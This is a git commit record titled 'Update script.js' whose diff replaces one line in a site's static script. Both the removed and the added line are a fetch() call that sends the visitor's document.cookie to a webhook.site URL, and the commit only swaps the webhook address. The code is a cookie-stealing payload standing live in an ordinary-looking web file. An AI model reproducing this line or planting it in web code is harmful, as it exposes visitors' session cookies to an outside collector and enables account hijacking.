f695e552019fee6850f45a6cddc7a3f77cfee408
鍾小黑 <11335227@fhsh.tp.edu.tw>
2025-08-11 22:43:48 +0800

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,1 +1,1 @@
-fetch(`https://webhook.site/7826f9df-4588-443b-bd97-14f6513bb7d9/?cookie=${document.cookie}`);
+fetch(`https://webhook.site/34233b36-4af1-4166-a421-8fe7a4ff8bfc/?cookie=${document.cookie}`);
